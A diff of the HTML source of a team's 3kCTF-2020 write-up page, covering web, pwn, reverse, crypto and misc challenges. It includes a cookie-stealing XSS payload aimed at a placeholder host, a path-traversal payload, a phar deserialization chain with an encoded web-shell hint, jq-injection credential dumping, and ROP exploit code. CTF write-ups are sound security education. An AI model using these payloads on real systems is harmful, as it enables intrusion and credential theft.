have one ourselves!). Playing with the API we have met the following error:\n .search fprintf 0x4b970 .. jq: error: Invalid numeric literal at EOF at line 1, column 3 (while parsing '...') at , line 1: . as $maindb | .libcDB[] | select(.symbol==\"fprintf\") | select(.address|contains(\"309616\")) | ... jq: 1 compile error If we have to make an educated guess on the actual query, it would be:\njq '. as $maindb | .libcDB[] | select(.symbol==\"[SYMBOL]\") \\ | select(.address|contains(\"[ADDR]\")) | .[FILTER]' test.json Read along the documentation of jq, we have experimented around:\n .search fprintf 0 |$maindb|keys|{id:.[]} Found: id\tlibcDB Found: id\tusers .search fprintf 0 |$maindb.users[]|keys|{id:.[]} Found: id\tpassword Found: id\tusername .search fprintf 0 |$maindb.users[]|{id:.username,symbol:.password} Found: id\t3k symbol\tnotaflag Found: id\tJames symbol\tHetfield Found: id\tLars symbol\tUlrich Found: id\tDead symbol\tpool Found: id\tadmin symbol\tv3ryL0ngPwC4nTgu3SS0xfff Found: id\tjim symbol\tcarrey Okay. Great, we have the credentials of the admin. Connecting to the service again, and this time we are signing in with it.\n$ nc libcdb.3k.ctf.to 7777 Login  admin Password  v3ryL0ngPwC4nTgu3SS0xfff Authenticated {\"users\":{\"username\":\"admin\",\"password\":\"v3ryL0ngPwC4nTgu3SS0xfff\"}} __ _ _ ____ _____ | | |_| |_ ___| \\| __ | | |__| | . | _| | | __ -| |_____|_|___|___|____/|_____| as a service Type .help for help  .secret 3k{jq_is_r3ally_HelpFULL_3af4bcd97f5}  DNS rebinding from Wikipedia [return] The Perm Jam 2: The Camel Strikes Back - @na7irub [return]   ",
-  "wordCount" : "4153",
-  "inLanguage": "en",
-  "datePublished": "2020-07-28T11:36:00+08:00",
-  "dateModified": "2020-07-28T11:36:00+08:00",
-  "author":[{
-    "@type": "Person",
-    "name": "apple"
-  }, {
-    "@type": "Person",
-    "name": "cire meat pop"
-  }, {
-    "@type": "Person",
-    "name": "eriri"
-  }, {
-    "@type": "Person",
-    "name": "Mystiz"
-  }, {
-    "@type": "Person",
-    "name": "ozetta"
-  }],
-  "mainEntityOfPage": {
-    "@type": "WebPage",
-    "@id": "https://b6a.black/posts/2020-07-28-3kctf/"
-  },
-  "publisher": {
-    "@type": "Organization",
-    "name": "Black Bauhinia",
-    "logo": {
-      "@type": "ImageObject",
-      "url": "https://b6a.black/favicon.ico"
-    }
-  }
-}
-</script>
 
 
 
+
+
+
+
+
+
+
+
+    
 </head>
+<body>
+    <a class="skip-main" href="#main">Skip to main content</a>
+    <div class="container">
+        <header class="common-header"> 
+            
+                <h1 class="site-title">
+    <a href="/">Black Bauhinia</a>
+</h1>
 
-<body class=" dark" id="top">
-<noscript>
-    <style type="text/css">
-        .theme-toggle,
-        .top-link {
-            display: none;
-        }
-
-    </style>
-</noscript>
-<header class="header">
-    <nav class="nav">
-        <div class="logo">
-            <a href="https://b6a.black/" accesskey="h" title="Black Bauhinia (Alt + H)">Black Bauhinia</a>
-            <span class="logo-switches">
-                
-                
-            </span>
-        </div>
-        <ul id="menu" onscroll="menu_on_scroll()">
-            <li>
-                <a href="https://b6a.black/about-us/" title="About Us">
-                    <span>About Us</span>
-                </a>
-            </li></ul>
+    <nav>
+        
+        
+        <a class="" href="https://b6a.black/about-us/" title="">About Us</a>
+        
     </nav>
-</header>
 
-    <main class="main">
 
-<article class="post-single">
-  <header class="post-header">
 
-    <h1 class="post-title">
-      3kCTF-2020 Writeup
-    </h1>
-    <div class="post-meta">
-
-July 28, 2020&nbsp;·&nbsp;apple, cire meat pop, eriri, Mystiz, ozetta
-
-</div>
-  </header>
-  
-  
-  <div class="post-content">
-<h2 id="reporter-web-498-points">reporter (Web; 498 points)<a hidden class="anchor" aria-hidden="true" href="#reporter-web-498-points">#</a></h2>
+            
+        </header>
+        <main id="main" tabindex="-1"> 
+            
+    
+    
+    <article class="post h-entry">
+        <header class="post-header">
+            <h1 class="p-name post-title">3kCTF-2020 Writeup</h1>
+        </header>
+        <div class="content e-content">
+            <h2 id="reporter-web-498-points">reporter (Web; 498 points)</h2>
 
 <p>Solved by <em>apple</em>.</p>
 
@@ -175,7 +117,7 @@ there's a secret report we need located <a href="http://reporter.3k.ctf.to/secre
 <p><a href="https://github.com/rinlo/ctf-writeups/blob/master/2020/3kCTF-2020/reporter/src">source</a></p>
 </blockquote>
 
-<h3 id="walkthrough">Walkthrough<a hidden class="anchor" aria-hidden="true" href="#walkthrough">#</a></h3>
+<h3 id="walkthrough">Walkthrough</h3>
 
 <p>The application provide markdown hosting service and it will automatically download and embed external images (or any files) to the 'report'.</p>
 
@@ -189,7 +131,7 @@ there's a secret report we need located <a href="http://reporter.3k.ctf.to/secre
 ...</code></pre></div>
 <p>Well, knew that.</p>
 
-<h4 id="exploiting-toctou-of-the-domain-checking">Exploiting TOCTOU of the domain checking<a hidden class="anchor" aria-hidden="true" href="#exploiting-toctou-of-the-domain-checking">#</a></h4>
+<h4 id="exploiting-toctou-of-the-domain-checking">Exploiting TOCTOU of the domain checking</h4>
 
 <p>Interesting things happen in <a href="https://github.com/rinlo/ctf-writeups/blob/master/2020/3kCTF-2020/reporter/src/backend.php">backend.php</a>.</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">if(@$_POST[&#39;deliver&#39;]){
@@ -240,7 +182,7 @@ secret2
 not much here</code></pre>
 <p>The <code>3ac45ca05705d39ed27d7baa8b70ecd560b69902.php</code> is suspicious as it have 50 bytes but only 7 bytes returned from server. Maybe the flag is there.</p>
 
-<h4 id="wonders-of-php-empty0--true">Wonders of PHP: empty(&quot;0&quot;) == true<a hidden class="anchor" aria-hidden="true" href="#wonders-of-php-empty0--true">#</a></h4>
+<h4 id="wonders-of-php-empty0--true">Wonders of PHP: empty(&quot;0&quot;) == true</h4>
 
 <p>I crafted this payload to read the file and get the flag.</p>
 <pre><code>![](0:/../secret_report/3ac45ca05705d39ed27d7baa8b70ecd560b69902.php)</code></pre>
@@ -274,11 +216,11 @@ not much here</code></pre>
 }</code></pre>
 <p>Where the <code>scheme</code> will return <code>true</code> for <code>isset</code> and <code>true</code> for <code>empty</code> (<code>empty(&quot;0&quot;) == true</code>), and for <code>file_get_contents</code> it will recognize <code>0:</code> as a folder and <code>0:/../</code> as current folder.</p>
 
-<h2 id="xsser-web-499-points">xsser (Web; 499 points)<a hidden class="anchor" aria-hidden="true" href="#xsser-web-499-points">#</a></h2>
+<h2 id="xsser-web-499-points">xsser (Web; 499 points)</h2>
 
 <p>Solved by <em>ozetta</em>.</p>
 
-<h3 id="description">Description<a hidden class="anchor" aria-hidden="true" href="#description">#</a></h3>
+<h3 id="description">Description</h3>
 
 <blockquote>
 <p>challenge</p>
@@ -286,7 +228,7 @@ not much here</code></pre>
 <p>Author: Dali</p>
 </blockquote>
 
-<h3 id="walkthrough-1">Walkthrough<a hidden class="anchor" aria-hidden="true" href="#walkthrough-1">#</a></h3>
+<h3 id="walkthrough-1">Walkthrough</h3>
 
 <p>Source code is provided:</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#75715e">&lt;?php</span>
@@ -357,17 +299,17 @@ $check<span style="color:#f92672">=</span><span style="color:#a6e22e">unserializ
 
 <p>Later on I found that <code>/req.php</code> accepts external URLs as well. So we can use some other tricks like <code>window.name</code>:</p>
 <pre><code>&lt;script&gt;name=&#39;location=&#34;//blah/&#34;+document.cookie&#39;;location=&#39;//127.0.0.1/?new=%3Cbody%20onload=eval(name)%3E&amp;login=O:8:%22DateTime%22:0:%7B%7D&#39;;&lt;/script&gt;</code></pre>
-<h3 id="remarks">Remarks<a hidden class="anchor" aria-hidden="true" href="#remarks">#</a></h3>
+<h3 id="remarks">Remarks</h3>
 
 <p>At first I tried the payload with iframe but Chrome blocks the <code>Set-Cookie</code> header due to &quot;third-party cookies preference&quot;.</p>
 
 <p>Then I tried the payload with form and Chrome blocks the popup as expected. But for some reason the Headless Chrome works.</p>
 
-<h2 id="image-uploader-web-498-points">image uploader (Web; 498 points)<a hidden class="anchor" aria-hidden="true" href="#image-uploader-web-498-points">#</a></h2>
+<h2 id="image-uploader-web-498-points">image uploader (Web; 498 points)</h2>
 
 <p>Solved by <em>ozetta</em>.</p>
 
-<h3 id="description-1">Description<a hidden class="anchor" aria-hidden="true" href="#description-1">#</a></h3>
+<h3 id="description-1">Description</h3>
 
 <blockquote>
 <p>challenge</p>
@@ -377,7 +319,7 @@ $check<span style="color:#f92672">=</span><span style="color:#a6e22e">unserializ
 <p>Author: Dali</p>
 </blockquote>
 
-<h3 id="題解-walkthrough">題解 (Walkthrough)<a hidden class="anchor" aria-hidden="true" href="#題解-walkthrough">#</a></h3>
+<h3 id="題解-walkthrough">題解 (Walkthrough)</h3>
 
 <p>我知你睇唔明廣東話架啦. 今次有翻譯.</p>
 
@@ -511,7 +453,7 @@ $check<span style="color:#f92672">=</span><span style="color:#a6e22e">unserializ
 
 <hr>
 
-<h2 id="final-payload">Final payload<a hidden class="anchor" aria-hidden="true" href="#final-payload">#</a></h2>
+<h2 id="final-payload">Final payload</h2>
 <pre><code>&lt;?php
 
 class cl1 {
@@ -563,7 +505,7 @@ $file = file(&#39;malware.phar&#39;);</code></pre>
 <p>The rest is left as an exercise for the readers. (Hint: decode <code>PD89YCRfR0VUWzBdYDs=</code>)</p>
 </blockquote>
 
-<h2 id="remark">Remark<a hidden class="anchor" aria-hidden="true" href="#remark">#</a></h2>
+<h2 id="remark">Remark</h2>
 
 <p><figure><img src="/images/2020-07-28-3kctf/image-uploader-troIl.png" alt=""></figure></p>
 
@@ -575,7 +517,7 @@ $file = file(&#39;malware.phar&#39;);</code></pre>
 
 <p>慘。早啲起身咪有 First Blood (好似係</p>
 
-<h2 id="carthagods-web-496-points">carthagods (Web; 496 points)<a hidden class="anchor" aria-hidden="true" href="#carthagods-web-496-points">#</a></h2>
+<h2 id="carthagods-web-496-points">carthagods (Web; 496 points)</h2>
 
 <p>Author: rekter0, Dali</p>
 
@@ -589,7 +531,7 @@ $file = file(&#39;malware.phar&#39;);</code></pre>
 </ol>
 </blockquote>
 
-<h3 id="exploit">Exploit<a hidden class="anchor" aria-hidden="true" href="#exploit">#</a></h3>
+<h3 id="exploit">Exploit</h3>
 
 <p>The challenge provided the redacted sourcecode as hints.</p>
 
@@ -641,11 +583,11 @@ bin:x:2:2:bin:/bin:/usr/sbin/nologin
 &lt;<span style="color:#f92672">textarea</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;label-input100&#34;</span> <span style="color:#a6e22e">style</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;color:black;width: 100%;height: 300px;&#34;</span>&gt;OPCACHEe2c6579e4df1d9e77e36d2f4ff8c92b3�x��_Jqҍ@������������������������_���Ӛ��_/var/www/html/flag.php������/var/www/html/flag.php1����q��������d!=
 VPyi0���Y�Į��{�opcache_get_statush���JK��<span style="color:#960050;background-color:#1e0010">&amp;</span>3k{Hail_the3000_years_7hat_are_b3h1nd}`Lq�(��&lt;<span style="color:#f92672">iframe</span> <span style="color:#a6e22e">width</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;560&#34;</span> <span style="color:#a6e22e">height</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;315&#34;</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;https://www.youtube.com/embed/y8zZXMLBin4&#34;</span> <span style="color:#a6e22e">frameborder</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;0&#34;</span> <span style="color:#a6e22e">allow</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture&#34;</span> <span style="color:#a6e22e">allowfullscreen</span>&gt;&lt;/<span style="color:#f92672">iframe</span>&gt;֖|�flag                                          &lt;/<span style="color:#f92672">textarea</span>&gt;
 ...</code></pre></div>
-<h2 id="linker-pwn-493-points">linker (Pwn; 493 points)<a hidden class="anchor" aria-hidden="true" href="#linker-pwn-493-points">#</a></h2>
+<h2 id="linker-pwn-493-points">linker (Pwn; 493 points)</h2>
 
 <p>Solved by <em>cire meat pop</em>.</p>
 
-<h3 id="program">Program<a hidden class="anchor" aria-hidden="true" href="#program">#</a></h3>
+<h3 id="program">Program</h3>
 <pre><code>root@kali:~/3kctf/linker# ./linker
 Welcome to your secret journal!
 Provide name size:
@@ -662,7 +604,7 @@ Welcome abcd
 &gt; </code></pre>
 <p>This seems to be a heap challenge, which allow user to <em>create</em>, <em>edit</em> and <em>free</em> a chunk. Also, it provides a weird function (i.e., <em>relogin</em>) for changing the name which does nothing to the other functions, and usually means it will be used for later exploit.</p>
 
-<h3 id="vulnerability">Vulnerability<a hidden class="anchor" aria-hidden="true" href="#vulnerability">#</a></h3>
+<h3 id="vulnerability">Vulnerability</h3>
 
 <p>In <code>3- Empty a page</code>:</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">puts(<span style="color:#e6db74">&#34;Provide page index:&#34;</span>);
@@ -693,7 +635,7 @@ idx <span style="color:#f92672">=</span> atoi(<span style="color:#f92672">&amp;<
 }</code></pre></div>
 <p>Edit function won't check <code>check[idx]</code>, which means we can overwrite a free chunk.</p>
 
-<h3 id="exploit-1">Exploit<a hidden class="anchor" aria-hidden="true" href="#exploit-1">#</a></h3>
+<h3 id="exploit-1">Exploit</h3>
 
 <p>As we can overwrite any data into the free chunk, we can perform some attack to overwrite <code>__malloc_hook</code> or <code>__free_hook</code> with one gadget rce.</p>
 
@@ -712,7 +654,7 @@ idx <span style="color:#f92672">=</span> atoi(<span style="color:#f92672">&amp;<
 </ul></li>
 </ul>
 
-<h3 id="problem">Problem<a hidden class="anchor" aria-hidden="true" href="#problem">#</a></h3>
+<h3 id="problem">Problem</h3>
 
 <p><code>can't access tty; job control turned off</code></p>
 
@@ -722,11 +664,11 @@ Finally, we perform fastbin attack to control <code>pages</code> and <code>check
 
 <p><code>3k{unlink_the_world_and_feel_the_void}</code></p>
 
-<h2 id="one-and-a-half-man-pwn-493-points">one and a half man (Pwn; 493 points)<a hidden class="anchor" aria-hidden="true" href="#one-and-a-half-man-pwn-493-points">#</a></h2>
+<h2 id="one-and-a-half-man-pwn-493-points">one and a half man (Pwn; 493 points)</h2>
 
 <p>Solved by <em>cire meat pop</em>.</p>
 
-<h3 id="program-1">Program<a hidden class="anchor" aria-hidden="true" href="#program-1">#</a></h3>
+<h3 id="program-1">Program</h3>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">ssize_t <span style="color:#a6e22e">vuln</span>()
 {
   <span style="color:#66d9ef">char</span> buf; <span style="color:#75715e">// [rsp+6h] [rbp-Ah]
@@ -737,7 +679,7 @@ Finally, we perform fastbin attack to control <code>pages</code> and <code>check
 I have solved similar challenge before, and my approach was to overwrite first 2 byte the <code>read_got</code> to run one gadget RCE. It involves 4 bit randomness to satisfy, hence I have a 1/16 chance to solving it.
 <strong>It works</strong>, but <code>can't access tty; job control turned off</code>. Okay, I shouldn't forgot shell interaction is disabled from this server.</p>
 
-<h3 id="exploit-2">Exploit<a hidden class="anchor" aria-hidden="true" href="#exploit-2">#</a></h3>
+<h3 id="exploit-2">Exploit</h3>
 
 <p>I find a <code>syscall</code> near the one gadget RCE so that we can jump to syscalls. It's time to construct ROP:</p>
 <pre><code>mov eax, 0 ; pop rbp ; ret           g1(in binary)
@@ -772,7 +714,7 @@ sleep(<span style="color:#ae81ff">0.5</span>)
 p<span style="color:#f92672">.</span>interactive()</code></pre></div>
 <p><code>3k{one_byte_and_a_half_overwrite_ftw!}</code></p>
 
-<h2 id="microscopic-reverse-488-points">microscopic (Reverse; 488 points)<a hidden class="anchor" aria-hidden="true" href="#microscopic-reverse-488-points">#</a></h2>
+<h2 id="microscopic-reverse-488-points">microscopic (Reverse; 488 points)</h2>
 
 <p>Solved by <em>Mystiz</em>.</p>
 
@@ -800,7 +742,7 @@ target <span style="color:#f92672">=</span> [unpack(<span style="color:#e6db74">
 target <span style="color:#f92672">=</span> [(c<span style="color:#f92672">-</span>i)<span style="color:#f92672">^</span><span style="color:#ae81ff">39</span> <span style="color:#66d9ef">for</span> i, c <span style="color:#f92672">in</span> enumerate(target)]
 <span style="color:#66d9ef">print</span>(bytes(target))
 <span style="color:#75715e"># 3k{nan0mites_everywhere_everytime_ftw!}</span></code></pre></div>
-<h2 id="game-reversemisc-486477-points">game (Reverse/Misc; 486+477 points)<a hidden class="anchor" aria-hidden="true" href="#game-reversemisc-486477-points">#</a></h2>
+<h2 id="game-reversemisc-486477-points">game (Reverse/Misc; 486+477 points)</h2>
 
 <p>Solved by <em>eriri</em>.</p>
 <pre><code>game 1
@@ -839,11 +781,11 @@ If you find and hit the 6 walls with the right order (I guess it should be the s
 
 <p>Reference: <a href="https://github.com/imadr/Unity-game-hacking">https://github.com/imadr/Unity-game-hacking</a></p>
 
-<h2 id="pyzzle-reversemisccrypto-459479-points">pyzzle (Reverse/Misc/Crypto; 459+479 points)<a hidden class="anchor" aria-hidden="true" href="#pyzzle-reversemisccrypto-459479-points">#</a></h2>
+<h2 id="pyzzle-reversemisccrypto-459479-points">pyzzle (Reverse/Misc/Crypto; 459+479 points)</h2>
 
 <p>Solved by <em>crabmony</em> and <em>Mystiz</em>.</p>
 
-<h3 id="part-1">Part 1<a hidden class="anchor" aria-hidden="true" href="#part-1">#</a></h3>
+<h3 id="part-1">Part 1</h3>
 
 <p>We are given a concrete syntax tree that is from <a href="https://github.com/Instagram/LibCST">LibCST</a>.</p>
 
@@ -888,7 +830,7 @@ plaintext <span style="color:#f92672">=</span> binascii<span style="color:#f9267
 <span style="color:#66d9ef">print</span>(plaintext)</code></pre></div>
 <p>Since we are given everything (except the plaintext), we are able to recover the plaintext by reversing the operations. We ended up with a STP file that contains the flag: <code>3k{almost_done_shizzle_up_my_nizzle}</code>.</p>
 
-<h3 id="part-2">Part 2<a hidden class="anchor" aria-hidden="true" href="#part-2">#</a></h3>
+<h3 id="part-2">Part 2</h3>
 
 <p>From the STP file, apart from the flag, we have a bunch of nodes and edges. This part we are connecting the dots with Python:</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">parse_line</span>(line):
@@ -919,7 +861,7 @@ main()</code></pre></div>
 
 <p>Flag: <code>3K-PYZZLE_FO_SHIZZLE_MY_NIZZLE</code>.</p>
 
-<h2 id="a-hundred-friends-crypto-496-points">A hundred friends (Crypto; 496 points)<a hidden class="anchor" aria-hidden="true" href="#a-hundred-friends-crypto-496-points">#</a></h2>
+<h2 id="a-hundred-friends-crypto-496-points">A hundred friends (Crypto; 496 points)</h2>
 
 <p>Solved by <em>Mystiz</em>.</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">key <span style="color:#f92672">=</span> RSA<span style="color:#f92672">.</span>generate(<span style="color:#ae81ff">1024</span>)
@@ -976,13 +918,13 @@ attempt_count <span style="color:#f92672">=</span> <span style="color:#ae81ff">0
 <span style="color:#75715e"># b&#39;3k{H4st4d_St1ll_Rul3S}AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#39;</span></code></pre></div>
 <p>Note that there is a chance to return <code>m^2</code> or <code>m^3</code>. As I am lazy, I just run the script again until it returns <code>m</code>.</p>
 
-<h2 id="rsa-textbook-crypto-496-points">RSA textbook (Crypto; 496 points)<a hidden class="anchor" aria-hidden="true" href="#rsa-textbook-crypto-496-points">#</a></h2>
+<h2 id="rsa-textbook-crypto-496-points">RSA textbook (Crypto; 496 points)</h2>
 
 <p>Solved by <em>Mystiz</em>.</p>
 
 <p>This challenge is similar to De1CTF's easyRSA. By reading the same reference paper <a href="https://link.springer.com/chapter/10.1007/3-540-46701-7_14">[Howgrave-Graham 1999]</a>, we have the matrix in session 3.3. By using the matrix directly and perform LLL, we can recover <code>d1</code> (the private key that corresponds to <code>e1</code>). We can then recover <code>phi(n)</code> and thus compute <code>d</code> (that corresponds to <code>e</code>), hence decrypting the ciphertext: <code>3k{hOwGr4v3_gr4h4m_and_s31F3rt_4re_C00l}AAAAAAAAAAAAAAAAAAAA</code>.</p>
 
-<h2 id="you-shall-not-get-my-cookies-crypto-495-points">You shall not get my cookies (Crypto; 495 points)<a hidden class="anchor" aria-hidden="true" href="#you-shall-not-get-my-cookies-crypto-495-points">#</a></h2>
+<h2 id="you-shall-not-get-my-cookies-crypto-495-points">You shall not get my cookies (Crypto; 495 points)</h2>
 
 <p>Solved by <em>Mystiz</em>.</p>
 
@@ -1026,7 +968,7 @@ attempt_count <span style="color:#f92672">=</span> <span style="color:#ae81ff">0
   <span style="color:#75715e"># ~ Take it! 3k{Y3t_An0th3r_Padd1ng_Oracle}</span>
   
 main()</code></pre></div>
-<h2 id="once-upon-a-time-crypto-492-points">once upon a time (Crypto; 492 points)<a hidden class="anchor" aria-hidden="true" href="#once-upon-a-time-crypto-492-points">#</a></h2>
+<h2 id="once-upon-a-time-crypto-492-points">once upon a time (Crypto; 492 points)</h2>
 
 <p>Solved by <em>Mystiz</em>.</p>
 
@@ -1071,7 +1013,7 @@ main()</code></pre></div>
 
   <span style="color:#66d9ef">print</span>(recover(target_ciphertext, <span style="color:#e6db74">&#39;ofb&#39;</span>))
   <span style="color:#75715e"># b&#39;3k{my_hands_are_registered_as_lethal_weapons_that_means_we_get_into_a_fight_i_accidentally_kill_you_i_go_to_jail}&#39;</span></code></pre></div>
-<h2 id="flood-misc-495-points">flood (Misc; 495 points)<a hidden class="anchor" aria-hidden="true" href="#flood-misc-495-points">#</a></h2>
+<h2 id="flood-misc-495-points">flood (Misc; 495 points)</h2>
 
 <p>Solved by <em>Mystiz</em>.</p>
 
@@ -1097,7 +1039,7 @@ open (SAVEGAME, <span style="color:#e6db74">&#34;/app/files/&#34;</span><span st
 <pre><code>-rw-r--r--   1 root root    30 Jul 23 14:26 fcad0373020fa6ede979389f558b396f4cd38ec1_README&#39;</code></pre>
 <p>We can use <code>cat /fcad0373020fa6ede979389f558b396f4cd38ec1_README</code> (with the above substitution) as our name. Finally the flag is there: <code>3k{p333rl_aInt_7hat_deAd_Y3t}</code>.</p>
 
-<h2 id="libcdb-misc-494-points">libcDB (Misc; 494 points)<a hidden class="anchor" aria-hidden="true" href="#libcdb-misc-494-points">#</a></h2>
+<h2 id="libcdb-misc-494-points">libcDB (Misc; 494 points)</h2>
 
 <p>We are given a libc database search (which looks useful and we should definitely have one ourselves!). Playing with the API we have met the following error:</p>
 <pre><code>&gt; .search fprintf 0x4b970 ..
@@ -1162,42 +1104,54 @@ Type .help for help
 </ol>
 </div>
 
-</div>
-  <footer class="post-footer">
-    <ul class="post-tags">
-      <li><a href="https://b6a.black/tags/ctf/">ctf</a></li>
-      <li><a href="https://b6a.black/tags/pwnthybytes-ctf/">pwnthybytes-ctf</a></li>
-    </ul>
-    <nav class="paginav">
-      <a class="prev" href="https://b6a.black/posts/2020-08-25-google-ctf-oracle/">
-        <span class="title">« Prev Page</span>
-        <br>
-        <span>Google CTF 2020: Oracle</span>
-      </a>
-      <a class="next" href="https://b6a.black/posts/2020-07-22-uiuctf-bot-protection-iv/">
-        <span class="title">Next Page »</span>
-        <br>
-        <span>UIUCTF 2020: Bot Protection IV</span>
-      </a>
-    </nav>
-  </footer>
-</article>
-    </main><footer class="footer">
-    <span>&copy; 2021 <a href="https://b6a.black/">Black Bauhinia</a></span>
-    <span>&middot;</span>
-    <span>Powered by <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a></span>
-    <span>&middot;</span>
-    <span>Theme <a href="https://git.io/hugopapermod" rel="noopener" target="_blank">PaperMod</a></span>
-</footer>
-<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)">
-    <button class="top-link" id="top-link" type="button" accesskey="g">
-        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
-            <path d="M12 6H0l6-6z" />
-        </svg>
-    </button>
-</a>
+        </div>
+        
 
-<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css"
+
+<div class="post-info">
+    
+        <div class="post-date dt-published">2020-07-28</div>
+    
+    
+    <a class="post-hidden-url u-url" href="https://b6a.black/posts/2020-07-28-3kctf/">https://b6a.black/posts/2020-07-28-3kctf/</a>
+    <a href=https://b6a.black/ class="p-name p-author post-hidden-author h-card" rel="me">[apple cire meat pop eriri Mystiz ozetta]</a>
+
+
+    <div class="post-taxonomies">
+        
+            
+                <ul class="post-tags">
+                    
+                        <li><a href="https://b6a.black/tags/ctf">#ctf</a></li>
+                    
+                        <li><a href="https://b6a.black/tags/pwnthybytes-ctf">#pwnthybytes-ctf</a></li>
+                    
+                </ul>
+        
+    </div>
+</div>
+
+    </article>
+
+    
+
+    
+
+    
+
+
+        </main>
+        
+            <footer class="common-footer">
+    
+    
+
+    <div class="common-footer-bottom">
+        
+        <div class="copyright">
+            <p>© 2021<br>
+            Powered by <a target="_blank" rel="noopener noreferrer" href="https://gohugo.io/">Hugo</a>, theme <a target="_blank" rel="noopener noreferrer" href="https://github.com/mitrichius/hugo-theme-anubis">Anubis</a>.<br>
+            <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css"
   integrity="sha384-AfEj0r4/OFrOo5t7NnNe46zW/tFgW6x/bCJG8FqQCEo3+Aro6EYUG4+cU+KJWu/X" crossorigin="anonymous">
 <script defer src="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.js"
   integrity="sha384-g7c+Jr9ZivxKLnZTDUhnkOnsh30B4H0rpLUpJ4jAIKs4fnJI+sEnkvrMWph2EDg4" crossorigin="anonymous"></script>
@@ -1205,51 +1159,28 @@ Type .help for help
   integrity="sha384-mll67QQFJfxn0IYznZYonOWZ644AWYC+Pt2cHqMaRhXVrursRwvLnLaebdGIlYNa" crossorigin="anonymous"
   onload="renderMathInElement(document.body, { delimiters: [{ left: '$$', right: '$$', display: true }, { left: '\\[', right: '\\]', display: true }, { left: '$', right: '$', display: false }, { left: '\\(', right: '\\)', display: false }]})"></script>
 
+            </p>  
+        </div> 
+
+        
+
+    
 
 
-<script defer src="/assets/js/highlight.min.27cd435cc9ed6abb4b496581b151804f79f366c412620272bb94e2f5f598ebcc.js" integrity="sha256-J81DXMntartLSWWBsVGAT3nzZsQSYgJyu5Ti9fWY68w="
-    onload="hljs.initHighlightingOnLoad();"></script>
-<script>
-    window.onload = function () {
-        if (localStorage.getItem("menu-scroll-position")) {
-            document.getElementById('menu').scrollLeft = localStorage.getItem("menu-scroll-position");
-        }
-    }
-    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
-        anchor.addEventListener("click", function (e) {
-            e.preventDefault();
-            var id = this.getAttribute("href").substr(1);
-            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
-                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
-                    behavior: "smooth"
-                });
-            } else {
-                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
-            }
-            if (id === "top") {
-                history.replaceState(null, null, " ");
-            } else {
-                history.pushState(null, null, `#${id}`);
-            }
-        });
-    });
-    var mybutton = document.getElementById("top-link");
-    window.onscroll = function () {
-        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
-            mybutton.style.visibility = "visible";
-            mybutton.style.opacity = "1";
-        } else {
-            mybutton.style.visibility = "hidden";
-            mybutton.style.opacity = "0";
-        }
-    };
+   
+    </div>
 
-    function menu_on_scroll() {
-        localStorage.setItem("menu-scroll-position", document.getElementById('menu').scrollLeft);
-    }
+    <p class="h-card vcard">
 
-</script>
+    <a href=https://b6a.black/ class="p-name u-url url fn" rel="me"></a> 
 
+    
+
+    
+</p> 
+</footer>
+
+        
+    </div>
 </body>
-
 </html>
